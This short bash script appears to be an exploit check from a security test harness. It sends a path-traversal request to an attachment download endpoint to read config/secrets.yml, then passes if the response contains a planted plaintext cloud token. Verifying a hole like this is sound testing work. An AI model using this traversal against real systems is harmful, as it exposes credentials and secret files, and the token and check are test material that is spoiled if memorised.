#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
out=$(curl -sG "$TARGET/api/attachments/download" --data-urlencode 'name=../../config/secrets.yml')
echo "$out" | grep -q 'cloud_token: rails-cloud-token-plaintext-91ef'
